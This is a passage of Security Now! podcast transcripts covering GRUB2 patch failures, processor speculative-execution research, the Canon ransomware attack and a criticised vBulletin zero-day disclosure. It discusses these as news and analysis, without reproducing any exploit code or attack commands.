Consequently, Red Hat is now advising users not to apply the GRUB2 security patches until these initial issues have been resolved.  They say, if someone has installed the fix, do not reboot your system.  Downgrade the affected patches.  And if the patches were applied and the system reboot was attempted and failed, users should boot from an RHEL or CentOS DVD in its troubleshooting mode, set up the network, then back out to restore the system's original boot.



Additionally, although the problem was first reported in Red Hat Enterprise Linux, apparently related bug reports are now rolling in from other distributions from other families, as well.  Ubuntu and Debian users are reporting systems which cannot boot after installing the GRUB2 updates, and Canonical has issued an advisory, including instructions for recovery on affected and no longer bootable systems.



So it's certainly good that the GRUB2 code got a clearly, very clearly much-needed close examination with many fixes.  I mean, dozens.  But this particular problem requires, as I said, the grub.cfg file to first be somehow maliciously altered.  And doing that would require physical access to the system or elevated privileges.  And at the moment, updating to fix this might render one's system completely unusable.



The obvious advice, since the sky is not actually falling, would be to wait a while until all the dust from this has settled, and the various kinks have been worked out of the process.  Then have a leisurely update and know that a bunch of potentially exploitable flaws have been fixed.  And that's a good thing.  But it's nice to hear, Leo, that you're not running with Secure Boot turned on because of course that's also a problem for SpinRite that I will have to be dealing with at some point.  If Secure Boot ever actually becomes an issue, you know, I will need to be able to get SpinRite to boot.  Well, either to have a user briefly disable it, if it was enabled, but I'm also seeing the same thing.  Nobody's running with it on.  It's just kind of in the way.  And we know now...



LEO:  Windows users are.  I mean, if you buy a Windows machine, and you don't do anything, it's going to have Secure Boot.



STEVE:  Right.



LEO:  But no Linux user would because, well, not "no."  I mean, I guess in enterprise there are signed versions of Linux.  But why should I take my version of Linux to Microsoft to get it signed so I can - it doesn't make any sense.  For a long time we thought Secure Boot was a conspiracy by Microsoft to damage Linux.  We now know that's not true.  But yeah, I just turn it off, usually.  Most of the time it's easier to install Linux that way.  And I'm glad to know it's not that secure.



STEVE:  Nothing to see.  Move along.



LEO:  Yeah.  It's pretty funny.



STEVE:  Wow.



LEO:  That's interesting that you can't - because you need to boot up clean to run SpinRite.  So you would need a signed version of, well, you're not using FreeDOS anymore; right?  You're going to just boot directly?



STEVE:  Yeah.  The UEFI version will boot natively.  So I would...



LEO:  You'd have to get it signed.



STEVE:  I'll either get it signed, I mean, it's probably very much like the driver signing process we have now.  As we know, Windows 10 requires signed drivers.  And I have a driver that I created as a little side project for something that Lorrie needed that needed to run under Windows 10.  So I got myself certified and got a driver signed so that it would run under unmodified Windows 10 systems.  So I imagine it's sort of like that.  I'm sure I will be able to do that.



LEO:  It's like getting an extended certificate or something.  It's really just to prove you are who you say you are.



STEVE:  Yeah.  And I may be able to do the same sort of shim thing where I get them to sign my CA, which then securely boots, in Secure Boot, boots SpinRite onto the system.



LEO:  Right, right.  And there are a lot of Linux users that don't use GRUB to boot, by the way.  There's other boot managers.  Systemd is a very popular one.



STEVE:  Right.



LEO:  I think GRUB is kind of probably fading away.



STEVE:  Well, boy, I mean, it got I guess a dearly needed security update.  Wow.  Whoo.



LEO:  rEFIt is also popular.  All right, my friend.  That's it for today.  Good job.  Your little boot with a hole in it.  Steve Gibson does this show every Tuesday - I usually show up - about 1:30 Pacific, 4:30 Eastern, 20:30 UTC.



STEVE:  Especially now that you're grounded, Leo.



LEO:  I ain't going nowhere.  That's right.  I'm here, man.  You can join us live if you want, watch us make the show.  That's easy enough.  All you have to do is go to TWiT.tv/live.  There's live audio and video streams from a variety of sources there.  Pick the one you like.  No more Mixer, but we still have others.  You can also get the show after the fact.  Steve's got 16Kb audio.  You're going to stop doing that, you said?



STEVE:  No, I think it's popular, yeah.



LEO:  Why not?  He also does the transcripts, which are great, and of course 64Kb audio.  So those versions are all at GRC.com.  While you're there, pick up a copy of SpinRite.  Hey, it couldn't hurt.  Great system recovery tool, hard drive recovery and maintenance utility.  Everybody ought to have it.  And if you get it now, you'll be ready to get 6.1 the minute it comes out, plus all the interim releases Steve's working on.  Somebody says your next release will be, what did they call it, something to bypass - BootRite, Steve's next program to fix the Secure Boot issues.  I like it.  BootRite.  GRC.com.



We have the show also, audio and video, at TWiT.tv/sn.  It's also on YouTube.  You can subscribe in your favorite podcast application.  That'd be the best way.  That way you'll get it the minute it's available, each and every Tuesday afternoon.  Thank you so much, Steve.  Have a great week.  Stay safe.  We'll see you next time on Security Now!.



STEVE:  Will do.  Bye.



LEO:  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#779

DATE:		August 11, 2020

TITLE:		Geneva

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-779.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we note the completion of the first virtual Black Hat and Defcon conferences.  We also examine the latest academic work to emerge from the Graz University, which dramatically advances our understanding of the past few years of performance optimizing processor vulnerabilities.  We look at the ransomware attack on Canon, a mishandled vBulletin vulnerability disclosure, the forthcoming support for DoH on Windows 10, and the result of Troy Hunt's yearlong quest to find a home for his much-loved "Have I Been Pwned" services.  We have a bit of miscellany, some feedback, and an update on my SpinRite work.  Then we examine a very interesting new technology being used to evade state-based Internet censorship known as "Geneva."



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  He's got reports of some of the hacks revealed at Black Hat and Defcon.  We'll also find out why speculative execution is something that's going to plague all processors for the foreseen future.  I don't know what we're going to do about that.  And then an AI bot designed to find security flaws.  They're turning it against the Great Firewall of China.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 779, recorded Tuesday, August 11th, 2020:  Geneva.



It's time for Security Now!, the show where we cover your security, now, with this guy, now, right here, Steve Gibson.  He is the guru of Security Now! and has been for near, lo, near all these 15 years.  Is that next year, next week that we're going to celebrate that?  



STEVE GIBSON:  Think it is.  I looked at it a couple weeks ago, and it's not on the day, but it's plus or minus one day.  So I think next week, 780, is the end of our 15th year; and then the next podcast, 781, begins year 16.  But this week we're at 779 for August 11th, and a really interesting topic.  You wouldn't know from the name of the podcast, "Geneva," what this is about.  And we're going to tease it a little bit for our listeners.



But we have a lot to talk about.  We're going to note the completion of the first virtual Black Hat and Defcon conferences.  And there was some news that came out of there, but on close examination nothing really stunning.  Like even that satellite, the guy that had been monitoring satellite communications forever and spotted a few things that were in the clear, it's like, yeah, well, okay.  If you watched any communications channel for a long time you'd see some leakage.  But anyways, we'll talk about that.



We're also going to examine the latest academic work to emerge from our friends at the Graz University.  They have dramatically advanced our understanding of the past few years of performance optimizing processor vulnerabilities.  Basically they stepped back and realized everyone had been wrong about what they thought the problem was.  They generalized it; and, as a result, have found a new set of attacks which apply to all processors - Intel, AMD, IBM, it doesn't matter.  ARM, just across the board.



LEO:  Wow.



STEVE:  We're also going to take a look at what we know about the ransomware attack on Canon.  A mishandled vBulletin vulnerability disclosure which was just unconscionable, we're seeing that again.  We have the forthcoming support for DoH on Windows 10.  Also the result of Troy Hunt's yearlong quest to find a new home for his much-loved Have I Been Pwned services, and some interesting insight thanks to his posting about that.  We've got a bit of miscellany, some feedback, and an update on my SpinRite work.  Then we're going to examine a very interesting new technology being used to evade state-based Internet censorship, which is what Geneva is the acronym for.  So I think a really interesting couple hours for our listeners.  And our Picture of the Week is an oldie but goodie.



LEO:  Oh, so it's not a hack.  It's a good thing, Geneva.



STEVE:  Oh, yeah.  Yeah, yeah.



LEO:  Yeah, I think - in fact, when I saw the Picture of the Week, I thought maybe we've done this before.  But maybe not.



STEVE:  We have.  But not for a while.  And still it's just...



LEO:  It's a classic.



STEVE:  You've got to say, what is the story behind this one?



LEO:  It's a classic.  It would get, let's put it this way, a security scorecard of F.  As low as you can get.



STEVE:  Well, yes.  And it's reminiscent of the gate in the middle of the path, where you can see the foot traffic that just walked around the gate because, okay, again, what were they thinking?



LEO:  All right.  We're going to get to it.  It's going to be a good show.  Steve?



STEVE:  Okay.  So our blast from the past, oldie but goodie Picture of the Week is, I mean, it looks authentic.  Maybe the whole thing is a spoof.  But if nothing else it's fun.  It's an 8.5 x 11 sheet, apparently stuck on some wood panel, that is titled "Password Change Signup Sheet."  And then the instructions are, "If you would like to change your password, please fill out the form below, and we will change your password on the system you indicate."



So, okay, first of all, that's a problem.  So this is public, apparently.  It's like, you know, hung next to the coffee machine or the water cooler.  And it's got the person's full name, then a column for which system.  And it says Yardi, email, et cetera.  And examples are email, phone, and Facebook have been put down in the column.  Then the person is giving their current password and then their new password.  And in the case of Jack H., who'd like his email password changed...



LEO:  They're all terrible passwords.



STEVE:  He's not being very creative.  The current password is reportedly "Password."



LEO:  Okay.



STEVE:  And the new password is I'd like it changed please to Password2.



LEO:  Really up the security with that.



STEVE:  Yeah.  And Liz wants her phone password changed.  Currently it's 89621, which suspiciously looks like maybe her zip code.  But anyway, she wants it changed to something simpler, apparently, just 4281.  And we've got, I don't know, Kyle.  The current password looks like Scooter49$, so that showed some originality.  He's wanting it to be changed to Skeeter442.  And then he says, "(all upper case)."



LEO:  Please, yes.



STEVE:  Even though he didn't write it in uppercase.  Anyway, so we don't know what the hell is going on here.



LEO:  I think it's a joke because you notice Sam Adams, whose password, he wants it to be "beer lover 1981."  I'm thinking it's a little bit of a joke.



STEVE:  Okay.



LEO:  But you know what, it could be real, too.  This would be a security scorecard of an "F," for sure.



STEVE:  Well, yeah.  And then what happened was Shawn decided, I don't know what it was, but he wrote  "Come see me" on a Post-it note.



LEO:  I think Shawn's the boss. 



STEVE:  Signed Shawn.



LEO:  Shawn's the boss, yeah.



STEVE:  And it may have been the Sam Adams because that's the last entry in a list of five.



LEO:  After that, yeah.



STEVE:  So maybe Shawn thought, okay, wait, you know, maybe this was not such a good idea.  Anyway, but obviously the point is, well, everybody gets the point.  This is just lunacy.  But anyway.  If for nothing else, a fun Picture of the Week for the podcast.



This is August 11th, making it August's Patch Tuesday.  And Patch Tuesdays have become so eventful - which is really not the word you want associated with patching your computer.  But they have become so eventful that we now talk about them on the Tuesday following the Patch Tuesday so we can discuss the events.  Woody Leonhard, who is a well-known, long-time PC personality, he writes his column for Computer World, he tweeted from @AskWoody:  "MS-DEFCON 2."  He said:  "Patch Tuesday's tomorrow.  Take a minute to make sure you have Automatic Update paused.  You have to get patched sooner or later, but there's no reason to join the ranks of the unpaid beta testers."  Which is pretty much the position he has taken recently.  So we'll cover all the details and, now, sadly, the inevitable fallout of what happens today, next week.



And speaking of weeks, we have last week, which was August 1st through 6th was the first virtual Black Hat event.  I looked through all of the disclosures.  Many of them are, sort of, of special interest, or maybe somewhat obscure.  But their titles, if nothing else, are quite titillating.  And I noticed that many of the issues are things we've already covered in previous weeks or in some cases months where I noted that this would then be discussed at the forthcoming Black Hat, which was last week.  And indeed it was.  So, and there were some interesting things.  But nothing, like, really jumped out at me.



I created one of my little shortcuts because it takes a bit of navigating to get there.  So if anyone is curious just to scan the list of presentations, grc.sc/bh.  Again, grc.sc for shortcut, /bh.  That will take you to the recent Black Hat presentation list.  And if you click on any one presentation, you might see something that you want more information about.  You'll find a summary of the presentation at some length, and then typically links to the presentation's slides, often an accompanied detailed whitepaper that can be downloaded.  And that's the kind of thing we normally discuss in detail sometimes months in advance of the actual presentation.  And in some cases even an accompanying software tool that can be downloaded to demonstrate whatever the presenter has, typically hosted over on GitHub.



So anyway, a little bit of a self-serve Black Hat because it was virtual.  Everything is online.  And nothing, again, nothing really jumped out at me.  I looked through everything.  And it may be that we end up covering something that ends up to be more than it looks like.



LEO:  You're going to cover Achilles; right?  I mean, that seemed like a serious - maybe not?



STEVE:  I'm not even sure what you're referring to.



LEO:  That's a vulnerability that affects 40% of all Android phones.



STEVE:  Ah, I did see that and did not dig into it. 



LEO:  Yeah, I think that one's maybe fairly serious.



STEVE:  That was the Snapdragon vulnerability?



LEO:  Yeah, big Qualcomm Snapdragon vulnerability.  And, you know, a billion phones.  The problem is most of those phones are older, so they won't be patched.



STEVE:  Right.  They're never going to get patched.



LEO:  There is a patch, but they're not going to get it.



STEVE:  Yeah.  Which unfortunately is the refrain these days.  Which, as we know, for our listeners, for what it's worth, we talk about absolutely looking at the patching reputation of anyone from whom you purchase a smartphone because it's a computer in your pocket, just as much as our desktops and laptops and workstations are computers.



LEO:  Yeah, I mean, Samsung just announced its new Samsung Galaxy Note 20 and said, hey, good news, three years of updates.  And I'm thinking, that's all?  But that's pretty typical in the phone space.



STEVE:  And that's a problem because on one hand it would be nice if they were committing to updates for the service life of the device.  On the other hand, you can understand, much like Windows, or like Microsoft, that finally decided to kill off, I mean, explicitly kill off support for previous versions completely.  Although, you know, you have to look at what has happened to Windows 10.  And now it's just a continuous rolling new version of Windows 10.  So it's not clear that anything changed there.  But what has changed is they are forcing you to move forward, rather than allowing you to stay with an older version for an indeterminate length of time.



So the Graz University gang are at it again.  Their most recent paper is titled "Speculative Dereferencing of Registers."  And, they said:  "Reviving Foreshadow."  I've got a link to the paper in the show notes, but I'll summarize it for people because there's nothing we as individuals are able to do about this.  In their paper they clearly demonstrate that, without a carefully conducted, purely academic understanding of the impact of modern processor design optimizations, which hadn't happened until now, it's not possible to make those designs truly secure.  They show that the actual fundamental root cause underlying many of the previously disclosed speculative execution attacks such as Meltdown and Foreshadow were or was misattributed to the effect of prefetching.  And this misapprehension resulted in the hardware vendors effectively rushing out and releasing incomplete mitigations and countermeasures for the problem.  That is, they didn't actually fix it.



So this paper, which is now public, shows that microarchitectural attacks, and we know that to mean attacks affecting the microarchitecture like the microcode and the things it's doing behind the instruction set, were actually caused by speculative dereferencing of user space registers in the kernel, and that it doesn't only impact the most recent Intel CPUs, which as we know have received most of the attention in the last couple years, including those from Intel carrying the latest hardware mitigations, meaning it still hasn't been fixed, but also several modern processors from ARM, IBM, and AMD which were previously believed to be immune.  So, I mean, this is sweeping impact.  So in other words, by developing, as they have, a true understanding of the problem, they've come up with a new approach to attacking the security guarantees provided by all modern processors.  All modern processors.



LEO:  You know who I bet's paying close attention to this is Apple, since they're in the process of developing new silicon based on the ARM architecture.  Just because it's based on it doesn't mean it can do the same thing.  I would think they would want to kind of eliminate these speculative execution pipelines and things.  I don't know.



STEVE:  Yes and no.  I'm going to come up with a possibility here at the end of this because when you...



LEO:  Yes, I want your prescription for what processors should do going forward.



STEVE:  Exactly.  So what they said in their abstract is not something we need to deeply understand, but it will give us all a better sense for this.  They said in the abstract of the paper:  "Since 2016, multiple microarchitectural attacks have exploited an effect that is attributed to prefetching.  These works observe that certain user-space operations can fetch kernel addresses into the cache.  Fetching user-inaccessible data into the cache enables KASLR" - we know that that's Kernel Address Space Layout Randomization - "breaks and assists various Meltdown-type attacks, especially Foreshadow.  In this paper we provide a systematic analysis of the root cause of this prefetching effect.



"While we confirm the empirical results of previous papers, we show that the attribution to a prefetching mechanism is fundamentally incorrect in all previous papers describing or exploiting this effect.  In particular, neither the prefetch instruction nor other user-space instructions actually prefetch kernel addresses into the cache, leading to incorrect conclusions and ineffectiveness of proposed defenses.  The effect exploited in all these papers is, in fact, caused by speculative dereferencing of user-space registers in the kernel. Hence, mitigation techniques such as KAISER" - which is the solution in Linux - "do not eliminate this leakage as previously believed.



"Beyond our thorough analysis of these previous works, we also demonstrate new attacks enabled by understanding the root cause, namely an address translation attack in more restricted contexts, direct leakage of register values in certain scenarios, and the first end-to-end Foreshadow exploit targeting non-L1 cache data.  The latter is effective even with the recommended Foreshadow mitigations enabled, and thus revives the Foreshadow attack."  And they conclude:  "We demonstrate that these dereferencing effects exist even on the most recent Intel CPUs with the latest hardware mitigations, and on CPUs previously believed to be unaffected, i.e., ARM, IBM, and AMD CPUs."



So what does this translate for us in the real world?  The researchers established a "cache-based covert channel," as they described it, that was able - they demonstrated it - able to exfiltrate data from a process running on an Intel Core i7 6500 CPU to their stealth process, achieving a transmission rate of 10 bits per second and relaying a total of 128 bytes from the sender process to the receiver.  Now, as we know, we're not looking at attacks any longer that export the whole process space.  That's not necessary because typically what you want are keys.  128 bytes, which they were able to pull out at 10 bits per second, is the length of four 256-bit cryptographic secrets.  So if you can steal the keys, you've pretty much got the kingdom.



They also worked out a means of leaking the register contents from an Intel SGX enclave, extracting a 32-bit secret value stored in the enclave in a 64-bit register within 15 minutes.  And to give their research a bit more bite, they also demonstrated some of their attacks can be performed at a distance using JavaScript combined with WebAssembly.



So this is mostly to get the attention of the people for whom it matters, which are the chip vendors and the OS vendors.  There's nothing that we as end users need to or can do about any of this.  In this we're all spectators.  The only full and true solution requires our processors to even further back away from their dearly beloved performance enhancements.  And Leo, to your point, it may be that someday we'll be given a choice between performance...



LEO:  And security.



STEVE:  ...and reduced security, yes.  Or full security with a performance compromise.  And you know, as we've talked about this, when we talked about Spectre and Meltdown and so forth, and how, well, first of all, this is all theoretical.  There hasn't been a single attack that's ever been demonstrated practically or in the wild.  It's just been security researchers saying, yeah, but we could.  And the environment matters.  I would argue it would make sense for unshared personal PCs to opt for performance, whereas cloud-based systems where they have a shared infrastructure, and they're also super beefy machines, they would probably have to take the enforced security route.  And this might be something you set in hardware, like a jumper on your motherboard.  So it's not even a BIOS thing that could be changed because that's too soft.



Maybe it's a different processor, where Intel says, well, we'll sell you the speedy one that's got all of the triple scoop enhancements that we know how to do.  But unfortunately it's got Spectre, it's got Meltdown, it's got Foreshadow.  It's vulnerable to all this.  But who cares?  If it's your computer, your different processes are the only things running on it.  And if something gets into your computer, then doing some really bleeding-edge Spectre thing is not what any malware's going to do.  It's going to encrypt your hard drive, or it's going to do something sort of blatantly nefarious, not try to leverage some very subtle cross-thread or cross-core cache leakage.  It's just not going to.



But in the meantime, since you're not worrying about all that, you get top-line performance from this processor.  Or if you do have an environment where security is more important than performance, and by that I mean this kind of like, okay, it's probably never ever going to bite you kind of security, except you have to be able to say we've chosen the Intel secure core system, yes, at two-thirds the performance, because we've had to disable all this stuff that the academicians have demonstrated could provide leakage.  But it's secure.  Certainly there's a market for that.



So, I mean, I can see it having, like, it going both ways.  What this comes down to clearly is that in order to optimize the operation of our systems, we must have caching.  And we must speculate.  We've got to load pipelines with both outcomes of a branch so that, regardless of which way the branch goes, we're already starting to execute down both paths because that's the way we get state-of-the-art performance is it's not the road less taken, it's both roads taken, and then we decide which outcome we want as soon as we figure out what the result of an earlier branch was.



We have, I mean, insane as that technology is, Intel has implemented it.  And that's the way we got the performance that has spoiled us.  But that inherently means that there will be traces of those decisions left behind when execution is suddenly changed to a different process.  And that's the way we do multiprocessing these days.  Now, maybe that could change so that instead of it just being a timer event, which ticks, and then suddenly a thread context is changed, maybe the solution if for the OS and the processor to agree on when it is safe to make a context switch.



So maybe we need to rethink the way we share a set of cores among a much larger set of processes and OS instances or VMs.  Maybe that's the route we'll take, some sort of a flushing or a safe-to-switch boundary.  Or it may be that you use lower performance systems if you really, really want to say, you know, even the academicians are finally happy, even if we need to add a few more processors to the system in order to get the same level of performance.  Anyway, the guys at Graz did it again.  Looks like this time they really cut it down to the bone, understood the nature of the problem.  And this really leaves us with a choice.



LEO:  It's inherent in all modern architectures that we have to do prefetching?  Or is it, I mean, is it conceivable that there could be optimizations that aren't susceptible to this kind of thing?



STEVE:  So the way Intel does the Intel architecture and all the others do their paging, this mapping between virtual memory and physical memory, it really is insane.  It's like four layers of indirection with these paging tables, which technically are in RAM.  But if you actually had to go get them from RAM, I mean, it would take you a year to boot your machine.  I mean, because you can't be going to get them from RAM.  So they have to bring them into the hardware in order to make the lookup fast.  And even then they cache the result of the four-way page table lookup, so they only have to do that when they don't have a result from the most, you know, a recently immediately previous lookup because that's the only way to make this system work.  Even that can be a source of compromise.



LEO:  So what about Optane, or some sort of faster RAM, or RAM that's closer to the CPU, or, I mean...



STEVE:  Yes.  And that's what's interesting.  Remember that all of this is the consequence of the fact that DRAM, which is based on a large sheet of capacitors, it has proven absolutely intractable for getting any speed increase.  Our processors just shot head of where DRAM remains.



LEO:  Interesting.



STEVE:  But there is that - what is that...



LEO:  Crossfire?



STEVE:  The Intel XPoint?



LEO:  Cross, yeah, that's Optane now.  That's the brand name.



STEVE:  Yeah.  The Optane memory is interesting because, although there's some concern about fatigue, it is at least dramatically faster.  And so if Optane gets built onto the chip, then maybe this can push this caching problem further down.  But also, even up at the higher level, technically speculation is caching; right?  Because we're pre-executing multiple paths and caching the outcome so that once a branch whose outcome we've been waiting for is determined, the processor's already gone down both paths and has got our results waiting for us.



So there are, I mean, it just turns out to be like all the clever things that designers have come up with leaves a trace down in the microarchitecture.  And the security researchers said, you know, you just can't do that.  We can sense that, and that allows us to determine what another process was doing when context switched to us.  So I think some level of rethinking, maybe, of the way processes and/or virtual machines share the processor is going to be necessary.



LEO:  I bet you there's people thinking about that.



STEVE:  Remember one of those attacks, there was a really cool - one of the Rowhammer attacks used the fact that you could have many more instances of Linux sharing a single hardware platform because they were all running Linux, and that meant they all had a copy of the same OS, which meant that the virtual machine manager was clever enough to point all of these separate VMs to the same physical memory.



LEO:  Right.



STEVE:  Instead of them each actually having what looks like a copy of their own physical memory.  In other words, they were doing page table collapsing where they were actually all sharing this, I mean, it's very clever and very cool.



LEO:  It's my understanding that's roughly how containerization works, as well.  And you know the world is moving towards containerization like Docker.  That's one of the benefits of it is that, you know, you can share the OS space.



STEVE:  Right.



LEO:  So, boy, I am - we clearly went down a wrong path.  Do you think these guys are right?



STEVE:  It was nice for a while, though.



LEO:  These guys - yeah, it was good while it lasted.  It's probably prudent at this point to reiterate that this only affects people with shared processes on the same processor, multiple different users with the same - because one of them could be malicious and could see in theory what you're doing in your process.  So that's why it's a server issue more, or a virtual private server issue more than it is an individual computing issue.  But, you know, honestly, the future in my opinion is that we're going to have - we won't need such processors on our desktop because we'll have server processors.  That's what this cloud gaming is.  And this could be a big dent in that possible future.  It's very interesting.



STEVE:  Yeah.



LEO:  There's got to be a way around it.  They don't have to do speculative execution.  Right?  Surely there's somebody, some bright guy is going to come along and say, oh, well, what if you did this?  And then in 10 years we'll be talking about the next thing.



STEVE:  You know, there is the possibility - it all comes down to the problem with the go-to instruction.  And if you changed things around so that you had the come-from, then that would really...



LEO:  I told you you guys should have used Lisp.  I've been telling you this.  You and your go-tos.  It's really an interesting conundrum.  And this is - these guys are reliable; right?  These are the guys who came up with the initial research.



STEVE:  Oh, yeah.  Oh, yeah, yeah, yeah, yeah.  They are, you know, they just they made their thesis advisors very happy with this one.



LEO:  Yes, yes.  Wow.  See, that's a big story.  That really is a big story, yeah.  Fascinating.



STEVE:  Yeah.  And the fact that it's not some mistake Intel made.



LEO:  No, everybody made it. 



STEVE:  It's fundamental.



LEO:  Yeah.  Well, and they didn't make a mistake.  It was a choice that turns out to have unfortunate consequences.  



STEVE:  Yeah.  And this goes deep.  Remember that we talked about how someone a while back did comment that, well, you know, if you do the speculation, then there could be some cross-process leakage of information.



LEO:  It was like '67 or something, or '76 this paper came out.



STEVE:  Right, right.



LEO:  And it was like the year before they started doing it.  So it was kind of known there's a potential here.



STEVE:  Yeah.



LEO:  Maybe we just didn't have the tools to achieve it or something.  I don't know.  I don't know.  Back to the drawing board.  And it ain't gonna be Intel this time.



STEVE:  We certainly do know that there has been an arms race for processor performance. 



LEO:  Right. 



STEVE:  And so it's understandable that without this being anyone's fault, really, the engineers did say, oh, wow, you know, we've got so much silicon now, we don't have to wait to see which branch the code takes.  We'll just do them both because, you know, why not?  And someone said, "Great idea.  Go."  And then so that seemed to be good.  You know?  It worked.  It executed the instructions correctly, and everybody was happy with it for, you know, quite a while.



LEO:  Yeah.



STEVE:  And then someone said, wait a minute.  The music ended, and there were like a lot of people standing and not...



LEO:  Hey, where's the chairs?  Where did the chairs go?



STEVE:  Yeah.



LEO:  It was 1995 somebody wrote this paper saying, hey, you could have a problem with this.  "The Intel x86 Processor Architecture:  Pitfalls for Secure Systems."  



STEVE:  Yup.



LEO:  1995 IEEE Symposium.  Warned against a covert timing channel in the CPU cache and translation lookaside buffer.  This was under the auspices of the NSA, which said, "Shhh, ixnay on the security issue.  Let it be that we know what no one else does.  What do you say?"  Wow.  The NSA.  Wow.  It's been going on for a while.



STEVE:  So one quickie, and then we'll take our second break because this is not big.  We can add Canon, you know, Canon Corporation, to the growing list of large high-profile companies who have a lot to lose, who have recently had their security compromised by a quite public ransomware attack.



LEO:  Gosh darn it.



STEVE:  BleepingComputer was all over this one.  And as they did with Garmin, they solicited and were able to obtain some previously unpublished internal memos in advance of any Canon official disclosure.  As we know, Canon's many services dropped offline on Thursday, July 30th, and remained down until they began returning to use six days later, a week ago, last Tuesday the 4th.  So this is a copy of what BleepingComputer got.  It's titled "Internal Message from the Crisis Management Committee."  Canon USA, Inc. and its subsidiaries understand the importance of maintaining the operational integrity and security of our systems.  Access to some Canon systems is currently unavailable as a result of a ransomware security incident we recently discovered.  This is unrelated to the recent issue which affected image.canon.



LEO:  Oh.  I thought it was the same thing.



STEVE:  I know.



LEO:  Oh.



STEVE:  That's what they're saying.  It's odd that the timing was what it was.



LEO:  Oh, wow.  Yeah, people were furious about image.canon.  They lost a lot of originals.  



STEVE:  Yes.  They said:  "We immediately implemented our response protocols and began an investigation.  Cybersecurity experts who have worked with other companies that have had similar issues have been engaged.  We are working quickly to address the issue and to restore operations.  As updates are available, we will do our best to communicate via email and ENS," whatever that is.  "We appreciate your patience as we work through this incident."



LEO:  If I were Canon, I would blame the image.canon loss on this.  Because what they're saying is, oh, no, it had nothing to do with that.  We just made a mistake in the code.  And that's why we lost all your images.



STEVE:  Ooh.  Yeah.



LEO:  I would have said, oh, yeah, could have.  It could be the ransomware.  Definitely.



STEVE:  It's the bad guy, yeah, it's the bad guys.



LEO:  And by the way, Canon said today, you ain't getting those images back.  They're gone.



STEVE:  Ooh, boy.



LEO:  Folks, I hope none of you used it as your only backup.  Remember what Leo says, and Steve, too.  One copy of anything is not a backup.



STEVE:  That was 10GB of free image upload and storage.



LEO:  Gone.



STEVE:  Yeah.  So we don't know anything about the way they got back online, how it was resolved, whether a ransom was paid or not, blah blah blah.  BleepingComputer did identify this, however, as the Maze ransomware, so different than the one that zapped Garmin.  But still, you know, this has got to be the issue that keeps companies and IT people up at night.  I mean,  at this point, how many times have we said it?  I understand the challenge when, as Garmin did, you have 30,000 workstations, and this thing rifles through them and gets to them.  That's going to be tough to bring back online.  But unfortunately, that's the price of playing the game these days.  Wow.  Leo, we will talk about a very sad event and disclosure with vBulletin after our second break.



LEO:  Wow.  What a world we live in.



STEVE:  Yeah.



LEO:  What was it they - now they're saying Garmin paid $10 million to get their data back.



STEVE:  Well, that was the asking price.  I don't think...



LEO:  Think they negotiated it down?



STEVE:  They could have.  There was a similar incident where the 10 million was asking, and they ended up paying 4.5, I think it was.  So still, you know, for a company like Garmin, if they really didn't have backups?  And of course the other problem now is exfiltration, you know, the embarrassment, because that's now, you know, it's okay, you may decide not to pay us, but we're going to just post all of your secrets. 



LEO:  That's why they get on the system, and they exfiltrate for three months, and then they ransomware.



STEVE:  Yup.



LEO:  That's the worst thing that can happen.



STEVE:  Okay.  So this story begins just two days ago, on Sunday, August 9th, with a posting by a security researcher who goes by the name Amir Etemadieh, and his Twitter handle is @zenofex.  He maintains a blog at "exploitee.rs," so sort of exploiters.  And to give you some feel for his approach, his recent postings have been titled "Rooting the Fire TV Cube and Pendant with FireFU," "All Your Things Are Belong to Us," "Hacking the Western Digital My Cloud NAS" (Network Attached Storage), "Re-Hacking The Samsung SmartCam."



So this guy clearly likes poking at things and documenting his discoveries.  He's also currently looking for a job.  He recently posted a pinned tweet addressed to Twitter, stating on July 6th:  "Hey Twitter.  I'm actively looking for a job.  An ideal role would include full-time exploit dev," he says, "(remote) with great benefits.  I have crashes, fuzzers, and a good zero-day.  If you have an opening that you think I may be a good fit for, contact me, zenofex@" and then http://zenofex.com.



Now, unfortunately, he followed up that job solicitation by Sunday irresponsibly posting his discovery and full details of a true zero-day exploit, a remote code execution exploit, against vBulletin, without ever giving them a heads-up.  You know, I'm not Twitter.



LEO:  Oh, that's too bad.



STEVE:  I know.  He's clearly a talented reverse engineer, and I'm sure he understands what he has just done, and somehow he doesn't care.  But I would not want this person inside my company.  So they say when you apply for a job these days, the content of your social media is typically scrutinized.  Well, were I considering someone to hire, it wouldn't be someone who was essentially boasting about a critical remote code execution vulnerability, posting full details in multiple languages, even a slide deck about it, and saying, you know, good luck.



So this particularly explosive security bomb he titled "Exploiting vBulletin:  A Tale of a Patch Fail."  And he wrote, he said:  "On September 23rd" - so September 23rd, 2019, right, like almost a year ago - "an undisclosed researcher released a bug which allowed for PHP remote code execution in vBulletin 5.0 through 5.4.  This bug (CVE-2019-16759) was labeled a 'bugdoor' by a popular vulnerability broker because of its simplicity, and was marked with a CVSS score of 9.8" - you know, 10 is the maximum.



LEO:  A 10?  That's not good.



STEVE:  Yeah.  So he writes:  "Today, we're going to talk about how the patch that was supplied for the vulnerability was inadequate in blocking exploitation, show how to bypass the resulting fix, and release a bash one-liner resulting in remote code execution in the latest vBulletin software."  He says:  "The vulnerability mentioned above was formally labeled CVE-2019-16759, and a patch was issued," blah blah blah.  So that kind of repeats things.  He says:  "Although the patch was provided in under three days, the patch seemed at the time to fix the proof of concept exploit provided."  In other words, vBulletin immediately responded and had it patched in under three days.



Okay.  Then Amir proceeds to take this apart, this previous work, step by step.  And like Sandbox Escaper, he's clearly a skilled technician.  His posting beautifully walks its reader through the way vBulletin's on-the-fly PHP authoring engine operates.  And he provides a proof of concept, and not just one.  He first offers a single cURL command line and provides a bash script he promised.  He also shows a Python exploit and indicates that he's in the process of pushing a public Metasploit module.  He even produced and published a deck, as I mentioned, of PowerPoint slides, a link for which I have in the show notes.



